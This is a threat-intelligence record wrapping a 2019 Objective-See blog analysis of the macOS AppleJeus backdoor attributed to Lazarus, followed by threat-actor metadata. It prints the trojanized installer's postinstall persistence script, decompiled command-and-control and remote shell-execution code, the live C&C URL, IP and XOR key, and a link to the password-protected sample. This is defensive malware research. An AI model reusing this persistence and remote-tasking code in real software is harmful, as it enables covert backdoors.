{
    "id": "fd81a1b5-9b84-4cc0-b83f-c113447d6fa3",
    "created_at": "2023-01-12T15:09:25.703746Z",
    "updated_at": "2025-03-27T02:17:23.163445Z",
    "deleted_at": null,
    "sha1_hash": "7c0a55d0aa6a8ec5d3934cd2e0c3230e0564bd66",
    "title": "2019-10-12 - Pass the AppleJeus",
    "authors": "",
    "file_creation_date": "2022-05-29T01:22:54Z",
    "file_modification_date": "2022-05-29T01:22:54Z",
    "file_size": 4238708,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x49.html**\n\nPass the AppleJeus\n\na mac backdoor written by the infamous lazarus apt group\n\nby: Patrick Wardle / October 12, 2019\n\nOur research, tools, and writing, are supported by \"Friends of Objective-See\"\nToday‚Äôs blog post is brought to you by:\n\n[CleanMy Mac X](https://macpaw.com/cleanmymac)\n\nMalwarebytes\nAiro AV\n\n[Become a Friend!](https://objective-see.com/friends.html)\n\\ \\\nüìù üëæ Want to play along?\nI‚Äôve shared the [OSX.AppleJeus sample (password: infect3d)](https://objective-see.com/downloads/malware/AppleJeus.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\nOn Friday [@malwrhunterteam tweeted about some interesting malware:](https://twitter.com/malwrhunterteam/)\n\nSo, in short: anyone installed this \"JMT Trader\" recently (or anytime? - others will\nprobably have the time to dig and find out...), got some APT's malware with it too...\n[pic.twitter.com/tEYJZEYxAq](https://t.co/tEYJZEYxAq)\n\n[‚Äî MalwareHunterTeam (@malwrhunterteam) October 11, 2019](https://twitter.com/malwrhunterteam/status/1182625004191731712?ref_src=twsrc%5Etfw)\n\n[At the time of said tweet, the sample was undetected by 0 engines on VirusTotal:](https://www.virustotal.com/gui/file/e352d6ea4da596abfdf51f617584611fc9321d5a6d1c22aff243aecdef8e7e55/detection)\n\n\n-----\n\nIn the same twitter thread, [@malwrhunterteam also noted this malware may have been seen](https://twitter.com/malwrhunterteam/)\nbefore (or at least was closely related to previous specimen analyzed by Kaspersky (as\n```\nOSX.AppleJeus )):\n\n```\nIf that highlighted not says anything to you... then look here in what malware it was\nseen before: [https://t.co/xSfDulILh0](https://t.co/xSfDulILh0)\n\ncc [@craiu](https://twitter.com/craiu?ref_src=twsrc%5Etfw) [pic.twitter.com/g2CyU87aLr](https://t.co/g2CyU87aLr)\n\n[‚Äî MalwareHunterTeam (@malwrhunterteam) October 11, 2019](https://twitter.com/malwrhunterteam/status/1182607363158822912?ref_src=twsrc%5Etfw)\n\nRead Kaspersky‚Äôs excellent write up on a previous (albeit closely related) malware\nspecimen: ‚ÄúOperation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer\nand macOS malware‚Äù\n\nAs we‚Äôll see, though related to the previously analyzed specimen, the sample we‚Äôre looking\nat today, is also rather unique!\n\n## More AppleJeus\n\n[In Kaspersky‚Äôs original writeup, they detailed an interesting attack whereas the Lazarus APT](https://securelist.com/operation-applejeus/87553/)\ngroup targeted various cryptocurrency exchanges ‚Äúwith a fake installer and macOS\nmalware‚Äù. One of the more interesting aspects of this operation, is that the APT group\nactually fabricated an entire fake company (‚ÄúCelas Trade Pro‚Äù) and website in order to\nincrease the realism of the attack.\n\n\"The victim had been infected with the help of a trojanized cryptocurrency trading\napplication, which had been recommended to the company over email. It turned out\nthat an unsuspecting employee of the company had willingly downloaded a third-party\napplication from a legitimate looking website\"\n\n\n-----\n\nAs part of my recent RSA [presentation I highlighted this attack as well:](https://www.rsaconference.com/industry-topics/presentation/whats-your-game-plan-leveraging-apples-game-engine-to-detect-threats)\n\nThe sample we‚Äôre looking at today, appears to follow an identical approach to infect macOS\ntargets. First, a ‚Äúnew‚Äù company was created: ‚ÄúJMT Trading‚Äù (hosted at:\n[https://www.jmttrading.org/):](https://www.jmttrading.org/)\n\nLooks reasonably legitimate, ya? Following the ‚ÄúDownload from Github‚Äù link, takes us to:\n[https://github.com/jmttrading/JMTTrader/releases, which contains various files for download.](https://github.com/jmttrading/JMTTrader/releases)\nFiles that contain malware! üëæ\n\nAs noted in another recent [tweet]\n(https://twitter.com/malwrhunterteam/status/1182740228550942721), the attackers appeared\nto have already updated the hosted files, replacing the malicious ones with pristine versions.\n\n\n-----\n\nI ve shared the [infected macOS disk image containing the AppleJeus malware (password:](https://objective-see.com/downloads/malware/AppleJeus.zip)\ninfect3d).\n\nHere we‚Äôll comprehensively examine the `JMTTrader_Mac.dmg disk image (sha1:`\n```\n74390fba9445188f2489959cb289e73c6fbe58e4 ):\n$ shasum -a 1 ~/Downloads/JMTTrader_Mac.dmg \n74390fba9445188f2489959cb289e73c6fbe58e4 ~/Downloads/JMTTrader_Mac.dmg\n\n```\nMounting the disk image reveals a single file: `JMTTrader.pkg`\n```\n$ hdiutil attach JMTTrader_Mac.dmg\nexpected  CRC32 $500E981E\n...\n/dev/disk3s1 41504653-0000-11AA-AA11-0030654 /Volumes/JMTTrader\n$ ls /Volumes/JMTTrader/\nJMTTrader.pkg\n\n```\nMy favorite tools for statically analyzing `.pkg files is an application, aptly named,`\n```\nSuspicious Package (available for download here).\n\n```\n\n-----\n\nVia this app, let s take a peek at the `JMTTrader.pkg :`\n\nAs can be seen, the package is not signed and contains a `postinstall script (which`\ncontains the actual installation instructions). Using the `Suspicious Package app, we can`\nview the contents of this install file:\n```\n 1#!/bin/sh\n 2mv /Applications/JMTTrader.app/Contents/Resources/.org.jmttrading.plist \n 3  /Library/LaunchDaemons/org.jmttrading.plist\n 4\n 5chmod 644 /Library/LaunchDaemons/org.jmttrading.plist\n 6\n 7mkdir /Library/JMTTrader\n 8\n 9mv /Applications/JMTTrader.app/Contents/Resources/.CrashReporter \n10  /Library/JMTTrader/CrashReporter\n11\n12chmod +x /Library/JMTTrader/CrashReporter\n13\n14/Library/JMTTrader/CrashReporter Maintain &\n\n```\nIn short, this install script:\n\n1. Installs a launch daemon plist ( org.jmttrading.plist )\n2. Installs a daemon ( CrashReporter )\n3. Executes said daemon with the `Maintain command line parameter.`\n\n\n-----\n\nNote that this requires administrative privileges, but the malware will kindly ask for such\nprivileges during installation:\n\nBoth the daemon‚Äôs plist and binary are (originally) embedded into an application,\n```\nJMTTrader.app found within the .pkg . Specifically they‚Äôre hidden files found in the\n\n```\n`/Resources directory;` `Resources/.org.jmttrading.plist` and\n```\nResources/.CrashReporter :\n\n```\nUsing the ‚ÄúSuspicious Package‚Äù app we can extract both these file for analysis.\n\n\n-----\n\nFirst, let s look at the launch daemon plist ( org.jmttrading.plist ):\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>org.jmttrading.jmttrader</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/Library/JMTTrader/CrashReporter</string>\n        <string>Maintain</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n</dict>\n</plist>\n\n```\nAs expected, it references the daemon `/Library/JMTTrader/CrashReporter (in the`\n```\nProgramArguments array). As the RunAtLoad is set to true macOS will automatically\n\n```\n(re)start the daemon every time the system is rebooted.\n\nNow on to the `CrashReporter binary.`\n\nVia the `file command, we can determine its file type (Mach-O 64-bit):`\n```\n$ file ~/Downloads/.CrashReporter \n~/Downloads/.CrashReporter: Mach-O 64-bit executable x86_64\n\n```\n[Using my WhatsYourSign utility, we can easily ascertain it‚Äôs code-signing status. Though](https://objective-see.com/products/whatsyoursign.html)\nsigned, it‚Äôs signed ad-hoc:\n\nRunning the `strings command, affords us valuable insight into the (likely) functionality of`\nthe binary.\n\n\n-----\n\n```\n$ strings a /Downloads/.CrashReporter \nContent-Disposition: form-data; name=\"%s\"; \njGzAcN6k4VsTRn9\n...\nmont.jpg\n...\nbeastgoc.com\nhttps://%s/grepmonux.php\nPOST\n...\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/72.0.3626.121 Safari/537.36\nX,%`PMk--Jj8s+6=\n\n```\n\\\nAlways run the `strings command with the` `-a flag to instruct it to scan the entire file for`\nprintable strings!\n\nFrom the output of the strings command, we can see some interesting, well, strings!\n```\n   beastgoc.com, https://%s/grepmonux.php\n\n```\nlikely a download or C&C server?\n```\n   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...\n\n```\nthe binary‚Äôs user-agent (perhaps useful as an IOC)?\n```\n   X,%\\`PMk--Jj8s+6=\n\n```\nperhaps an encryption or decryption key?\n\n## Detailed Analysis\n\nNow, it‚Äôs time to dive in and tear apart the `CrashReporter binary! Let‚Äôs pop over to a virtual`\nmachine and start a detailed analysis.\n\nThe binary‚Äôs `main function is actual rather simple, and due to named functions, rather`\ninformative:\n\n\n-----\n\n```\n 1int _main(int arg0, int arg1, int arg2, int arg3) {\n 2\n 3  if ((arg0 != 0x2) || (strcmp(arg1, \"Maintain\") != 0x0)) goto exit;\n 4\n 5  make_token();\n 6  chdir(\"/\");\n 7  \n 8  loop:\n 9    rcx = 0x0;\n10    do {\n11        do {\n12            rbx = rcx;\n13            while (conn_to_base() != 0x0) {\n14                sleep(0x5);\n15            }\n16            usleep(0x186a0);\n17            rax = listen_message();\n18            rcx = 0x0;\n19        } while (rax == 0x0);\n20        rcx = rbx + 0x1;\n21    } while (rbx < 0x3);\n22    sleep(0x384);\n23    goto loop;\n24\n25  exit:\n26    return 0x0;\n27}\n\n```\nFrom the above decompilation, we can ascertain the following:\n\n1. The malware expects to be executed with a single commandline argument: `Maintain`\n\n(Recall that when the malware was persisted, this argument is passed in via the launch\ndaemon plist).\n\n2. After generating a (random) token, the malware enters a loop.\n\n3. The loop invokes a function named `conn_to_base .`\n\n4. If the `conn_to_base function succeeds, it invokes a function named`\n```\n   listen_message .\n\n```\nWe can start the malware in a debugger ( lldb ), making sure to set the required argument:\n```\n$ lldb ./CrashReporter \n(lldb) target create \"./CrashReporter\"\nCurrent executable set to './CrashReporter' (x86_64).\n(lldb) settings set target.run-args Maintain\n\n```\nFirst, we‚Äôll set a breakpoint on the `conn_to_base function (address:`\n```\n0x0000000100001fd7 ).\n\n```\n\n-----\n\n```\n 1int conn_to_base() {\n 2  \n 3  r15 = malloc(0x30000);\n 4  r14 = malloc(0x30000);\n 5  __bzero(r15, 0x30000);\n 6  __bzero(r14, 0x30000);\n 7  \n 8  r15 = g_token;\n 9  (r15 + 0x4) = _g_version;\n10  (r15 + 0x8) = getpid();\n11\n12  var_1C = 0x0;\n13  rax = send_to_base(rdi, r15, 0xc, r14, &var_1C, 0x0);\n14  rbx = rax;\n15  if (rax == 0x0) {\n16      if ((var_1C == 0x3) && (strcmp(r14, \"200\") == 0x0)) {\n17          rbx = 0x0;\n18      }\n19      else {\n20          rbx = 0x2;\n21      }\n22  }\n23  ...\n24  \n25  rax = rbx;\n26  return rax;\n27}\n\n```\nAfter allocating two buffers, the `conn_to_base function initializes one of the buffers with the`\n(randomly) generated token, the binary‚Äôs version ( _g_version ), and the process‚Äôs pid.\n\nThe version, is found at `0x0000000100003414, and is set to` `0x1 (likely indicating this is`\nversion 1.0 of the binary).\n```\n1_g_version:\n20x0000000100003414 dd 0x00000001\n\n```\nThe `conn_to_base function then invokes a function named` `send_to_base (we‚Äôll get to`\nthis shortly). If that function returns exactly three bytes, set to the string `200 the`\n```\nconn_to_base will return a 0, indicating success. (Recall the main function is sitting in a\n\n```\nloop, wait for upon this success will invoke the `listen_message() function).`\n\nWhat does the `send_to_base function do? If you guessed ‚Äúconnect to a C&C server‚Äù`\nyou‚Äôre correct!\n\nThough the function is rather long, it‚Äôs logic can be summarized as follows:\n\n\n-----\n\nConstruct the URL of the C&C server: `https://beastgoc.com/grepmonux.php`\n```\nCrashReporter`send_to_base:\n-> 0x100001895 : callq sprintf\nTarget 0: (CrashReporter) stopped.\n(lldb) x/s $rsi\n0x100002c0d: \"https://%s/grepmonux.php\"\n(lldb) x/s $rdx\n0x100002c00: \"beastgoc.com\"\n\n```\nNote this URL resolved to `185.228.83.32 and at the time of analysis was still up and`\nresponsive.\nEncrypt any passed in data (such as the generated token, the binary‚Äôs version\n( _g_version ), and the process id).\n```\n 10x000000010000170e 488D0DEB1C0000     lea    rcx, qword [_cbc_iv]\n 2\n 3;xor loop\n 40x0000000100001715 89C2          mov    edx, eax\n 50x0000000100001717 83E20F         and    edx, 0xf\n 60x000000010000171a 8A140A         mov    dl, byte [rdx+rcx]\n 70x000000010000171d 41301404        xor    byte [r12+rax], dl\n 80x0000000100001721 48FFC0         inc    rax\n 90x0000000100001724 4839C3         cmp    rbx, rax\n100x0000000100001727 75EC          jne    loc_100001715\n\n```\nNote the xor ‚Äúencryption‚Äù key is stored at `0x0000000100003400 in variable named:`\n```\n_cbc_iv :\n1(lldb) x/s 0x0000000100003400\n20x100003400: \"X,%`PMk--Jj8s+6=\\x02\"\n\n```\n\n-----\n\nSend an HTTP `POST request to` `https://beastgoc.com/grepmonux.php`\ncontaining the following data:\n```\n   (lldb)x/s 0x100260000\n   0x100260000: \"--jGzAcN6k4VsTRn9\\r\\nContent-Disposition: form-data; name=\"token\";\n   \\r\\n\\r\\n756222899\\r\\n--jGzAcN6k4VsTRn9\\r\\nContent-Disposition: form-data;\n   name=\"query\"; \\r\\n\\r\\nconn\\r\\n--jGzAcN6k4VsTRn9\\r\\nContent-Disposition: form   data; name=\"content\"; filename=\"mont.jpg\"\\r\\nContent-Type: application/octet   stream\\r\\n\\r\\n\\xffffffeb'6MQMk-|Oj8\\r\\n--jGzAcN6k4VsTRn9--\\r\\n\"\n\n```\nValues such as `token,` `query,` `content and` `mont.jpg are hardcoded in the`\nbinary:\n```\n   10x00000001000016cc 48B8636F6E74656E7400  movabs   rax, 'content'\n   2...\n   30x00000001000016f4 48B96D6F6E742E6A7067  movabs   rcx, 'mont.jpg'\n\n```\nAnd what about the `\\xffffffeb'6MQMk-|Oj8 ? That‚Äôs the data (token, version, pid),`\nthat was xor encrypted!\nIn a callback block (set via: `[r12 dataTaskWithRequest:r13`\n```\n   completionHandler:&callback] ), parse the response from the C&ampC; server.\n\n```\nSpecifically the length of the response is checked, and if it‚Äôs non-zero, the bytes of the\nresponse are extracted:\n```\n   1if ([r14 length] != 0x0) {\n   2  rax = [r14 length];\n   3  *(int32_t *)*(r12 + 0x30) = rax;\n   4  \n   5  [r14 getBytes:*(r12 + 0x38) length:rax];\n   6}\n\n```\nThe first time the `send_to_base function is invoked (via the` `conn_to_base function), it`\nsucceeds: the C&C server returns three bytes containing the string `200 :`\n```\n(lldb) Target 0: (CrashReporter) stopped.\n(lldb) x/s 0x100230000\n0x100230000: \"200\"\n\n```\nRecall that when the code returns back up into the `main function, the` `listen_message`\nfunction will now be executed:\n```\n1while (conn_to_base() != 0x0) {\n2  sleep(0x5);\n3}\n4usleep(0x186a0);\n5rax = listen_message();\n\n```\n\n-----\n\nThe `listen_message function (re)invokes the` `send_to_base function and parses an`\nencrypted response from the C&C server. Depending on the response, it performs various\nactions. In other words, it‚Äôs expecting tasking from the remote server!\n```\n 1int listen_message() {\n 2\n 3...\n 4\n 5send_to_base(_g_token, 0x0, 0x0, r12, r13, 0x1);\n 6\n 7\n 8//decrypt\n 9do {\n10  (r12 + rax) = *(int8_t *)(r12 + rax) ^ *(int8_t *)((rax & 0xf) + _cbc_iv);\n11  rax = rax + 0x1;\n12} while (rbx != rax);\n13\n14\n15//handle tasking (commands)\n16if (strcmp(r12, \"exit\") == 0x0) goto exit;\n17\n18if (strcmp(r12, \"kcon\") == 0x0) goto kcon;\n19\n20if (is_str_start_with(r12, \"up \") == 0x0) goto up;\n21\n22...\n\n```\nUnfortunately during analysis, the C&C server did not return any tasking. However, via static\nanalysis, we can fairly easily ascertain the malware‚Äôs capabilities.\n\nFor example, the malware supports an ‚Äúexit‚Äù command, which will (unsurprisingly) causes\nthe malware to exit:\n```\n 1if (strcmp(r12, \"exit\") == 0x0) goto exit;\n 2\n 3...\n 4\n 5exit:\n 6  r14 = 0x250;\n 7  var_434 = 0x0;\n 8  __bzero(r12, 0x30000);\n 9  send_to_base(*(int32_t *)_g_token, r14, 0x2, r12, &var_434, 0x2);\n10  free(r12);\n11  free(r14);\n12  exit(0x0);\n\n```\nIf the malware receives the `up command, it appears to contain logic to open then write to a`\na file (i.e. upload a file from the C&C server to an infected host):\n\n\n-----\n\n```\n 1if (is_str_start_with(r12, up ) ! 0x0)\n 2{\n 3  //open file\n 4  rax = fopen(&var_430, \"wb\");\n 5  \n 6  //(perhaps) get file contents from C&C server?\n 7  send_to_base(*(int32_t *)_g_token, r14, 0x2, r12, r13, 0x2)\n 8  ...\n 9\n10  //decrypt\n11  do {\n12     (r12 + rax) = (r12 + rax) ^ (rax & 0xf) + _cbc_iv);\n13      rax = rax + 0x1;\n14  } while (rbx != rax);\n15\n16  //write out to disk\n17  fwrite(r12, rbx, 0x1, var_440);\n18\n19  //close\n20  fclose(var_440);\n21\n22}\n\n```\nOther commands, will cause the malware to invoke a function named: `proc_cmd :`\n```\n1if ((rbx < 0x7) || (is_str_start_with(r12, \"stand \") == 0x0)) \n2  goto loc_10000241c;\n3\n4loc_10000241c:\n5  rax = proc_cmd(r12, r14, &var_438);\n\n```\nThe `proc_cmd function appears to execute a command via the shell (specifically via the`\n```\npopen API):\n1int proc_cmd(int * arg0, int * arg1, unsigned int * arg2) {\n2  r13 = arg2;\n3  r14 = arg1;\n4  \n5  __bzero(&var_430, 0x400);\n6  sprintf(&var_430, \"%s 2>&1 &\", arg0);\n7  rax = popen(&var_430, \"r\");\n$ man popen\nFILE * popen(const char *command, const char *mode);\nThe popen() function ``opens'' a process by creating a bidirectional pipe, forking,\nand invoking the shell.\nThe command argument is a pointer to a null-terminated string containing a shell\ncommand line. This command is passed to /bin/sh, using the -c flag; interpretation,\nif any, is performed by the shell.\n\n```\n\n-----\n\nThe ability to remotely execute commands, clearly gives a remote attacker full and extensible\ncontrol over the infected macOS system!\n\n## Connection to Lazarus APT Group?\n\nAs noted, a closely-related sample was previously analyzed by Kaspersky in their writeup\ntitled: ‚ÄúOperation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer and\nmacOS malware‚Äù\n\nThe question arises, is this sample related and how? This is actually a fairly easy question to\nconclusively: ‚Äúyes‚Äù. Here we highlight several undeniable similarities and identicalities:\n\nThe infection mechanism is essentially identical\n\nIn both attacks, the APT group created a legitimately looking cryptocurrency company\nthat hosted the malware.\n\nThe `.pkg s from both attacks share a similar layout. Specifically an` `postinstall`\nscript will persistently install the malware as a launch daemon, extracting a hidden plist\nfrom the applications‚Äô `/Resources directory.\\`\n\nThough both samples are signed, neither are signed with a Apple developer ID. This is\nrather unusual.\n\nBoth malware samples are persisted as launch daemons that require a single\ncommandline argument in order to execute. Comparing the two samples, though the\nlogic is inverted (likely due to compiler differences), the following code snippets\nillustrate this similarity:\n```\n1//sample 1\n2int main()\n3{\n4  //check arg 1\n5  if ((arg0 == 0x2) && (strcmp(arg1, \"CheckUpdate\") == 0x0)) //go\n6}\n\n```\n\\\n```\n1//sample 2\n2int main()\n3{\n4  //check arg 1\n5  if ((arg0 != 0x2) || (strcmp(arg1, \"Maintain\") != 0x0)) //exit\n6}\n\n```\n\\\nKaspersky (in their original analysis) of another Lazarus backdoor stated:\n\n\n-----\n\nApparently the command-line argument is the way to prevent the detection of its\nmalicious functionality via sandboxes or even reverse engineering. We have previously\nseen this technique adopted by Lazarus group in 2016 in attacks against banks. As of\n2018, it is still using this in almost every attack we investigated.‚Äù\n\nThere are many other similarities both samples (e.g. constants, etc) that again highlight\na strong relationship between the two attacks. For example both samples look for the\nC&C server to return the same three bytes, ‚Äú200‚Äù:\n```\n1//previous sample\n2var_70 = QString::fromAscii_helper(\"200\", 0x3);\n3rax = QString::compare(&var_40, &var_70, 0x1);\n4if (rax != 0xffffffff) {\n5  ...\n6}\n1//current sample\n2if ((var_1C == 0x3) && (strcmp(r14, \"200\") == 0x0)) {\n3  ...\n4}\n\n```\nIMHO, without a doubt, both malware specimen‚Äôs where written by the APT group: Lazarus.\n\nHowever, though both malware samples are written by the same APT group, the samples\nare not the same.\n\nFirst, as noted by Kaspersky in their writeup on the previous Lazarus backdoor, that\nbackdoor was ‚Äúimplemented using a cross-platform QT framework.‚Äù The sample we looked\nat today, is solely created for macOS (there is no cross-platform code).\n\nThe previous backdoor also ‚Äúcollects basic system information ‚Ä¶ such as host name, OS\ntype and version, System architecture, OS kernel type and version‚Äù Today‚Äôs specimen does\nnot appear to contain this functionality.\n\nFinally the commands supported by today‚Äôs sample, appear to be be unique to this sample.\nThat is to say, the command strings (‚Äúexit‚Äù, ‚Äúup‚Äù, ‚Äúkcon‚Äù) do not appear in the specimen\npreviously analyzed by Kaspersky.\n\nRecall also that the malware we analyzed today contained a version 1.0 string:\n```\n1_g_version:\n20x0000000100003414 dd 0x00000001\n\n```\n‚Ä¶perhaps our sample is a precursor to the more comprehensive sample uncovered and\nanalyzed by Kaspersky? Or perhaps its a completely separate Lazarus backdoor.\n\n## Detection\n\n\n-----\n\nAs this malware is not particularly sophisticated, it s actually fairly easy to detect.\nUnfortunately at the time of analysis, no engines on VirusTotal detected the malware:\n\n\\\nIt should be noted that for any particular AV engine (on VirusTotal), said engine may only be\none (small?) piece of a more complete security product.\nThat is to say, a company‚Äôs comprehensive security product may also include a behaviorbased engine (not included on VirusTotal) that perhaps could generically detect this new\nthreat.\n\nOf course, behavior-based tools have no problem detecting the malware‚Äôs malicious activity\n(even with no a priori knowledge of the malware).\n\nFirst, [BlockBlock will alert when the malware attempts to persist as a launch daemon:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nSimilarly, a system scanned with [KnockKnock will show the malware as a persistent launch](https://objective-see.com/products/knockknock.html)\n\ndaemon:\n\nIf [LuLu is installed, it will generate an alert when the malware attempts to connect out to it‚Äôs](https://objective-see.com/products/knockknock.html)\nC&C server for tasking:\n\nAnd finally, [Netiquette (which enumerates active network connections), will show the](https://objective-see.com/products/netiquette.html)\nmalware connection to its remote C&C server ( 185.228.83.32 ):\n\n\n-----\n\nIn terms of manual detection (IOCs), the following should suffice:\n\nThe malware‚Äôs launch daemon plist file:\n\n```\n/Library/LaunchDaemons/org.jmttrading.plist\n\n```\n\nThe malware‚Äôs persistent binary, installed at `/Library/JMTTrader/CrashReporter`\nor running:\n```\n   $ ps aux | grep JMTTrader/CrashReporter \n   root /Library/JMTTrader/CrashReporter Maintain\n\n## Conclusion\n\n```\nIt‚Äôs not everyday we get a new macOS malware specimen to tear apart, especially one\n[written by a reasonably sophisticated APT group. (Mahalo again to @malwrhunterteam for](https://twitter.com/malwrhunterteam/)\nuncovering this sample and bringing it to my attention!)\n\nToday, we analyzed a (new?) Lazarus backdoor that affords a remote attacker complete\ncommand and control over infected macOS systems.\n\nDo you have to worry about getting infected? Probably not, unless you‚Äôre an employee\nworking at a crypto-currency exchange.\n\n[But either way, our free (largely) open-source security tools can generically provide](https://objective-see.com/products.html)\nprotection against this and other macOS threats! ü•≥ \\\n\n‚ù§ Love these blog posts and/or want to support my research and tools? \\ You can support\nthem via my [Patreon](https://www.patreon.com/bePatron?c=701171) page! \\\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-10-12 - Pass the AppleJeus.pdf"
    ],
    "report_names": [
        "2019-10-12 - Pass the AppleJeus.pdf"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
